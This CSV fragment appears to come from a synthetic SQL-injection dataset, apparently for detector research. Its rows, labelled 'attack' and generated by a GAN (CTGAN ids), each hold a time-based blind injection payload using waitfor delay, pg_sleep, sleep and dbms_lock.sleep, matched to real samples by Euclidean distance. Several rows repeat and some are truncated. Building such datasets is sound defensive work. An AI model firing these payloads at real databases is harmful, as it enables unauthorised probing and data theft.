id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000181,attack,time,waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,nearest_attack_euclidean,R000162,5.638025109505509
CTGAN_000182,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000186,5.732273486940618
CTGAN_000183,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000087,6.519653893837394
CTGAN_000184,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.865275208904161
CTGAN_000185,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,6.962202953520035
CTGAN_000186,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000103,6.013855938874354
CTGAN_000187,attack,time,1   )    )    as ewlg where 3722  =  3722 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000099,6.221067494112078
CTGAN_000188,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000049,5.821080271504771
CTGAN_000189,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,6.082701933016339
CTGAN_000190,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000278,5.29432683495549
CTGAN_000191,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000158,8.447555211177793
CTGAN_000192,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,7.358675114996953
CTGAN_000193,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000110,6.2621385274974415
CTGAN_000194,attack,time,1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000138,6.7745126605642785
CTGAN_000195,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R000118,6.34387306026398
CTGAN_000196,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000142,5.853149032604401
CTGAN_000197,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",nearest_attack_euclidean,R000277,5.6314729242638935
CTGAN_000198,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000207,5.871912102187487
CTGAN_000199,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",nearest_attack_euclidean,R000235,7.5048725441567985
CTGAN_000200,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000212,5.921081135440811
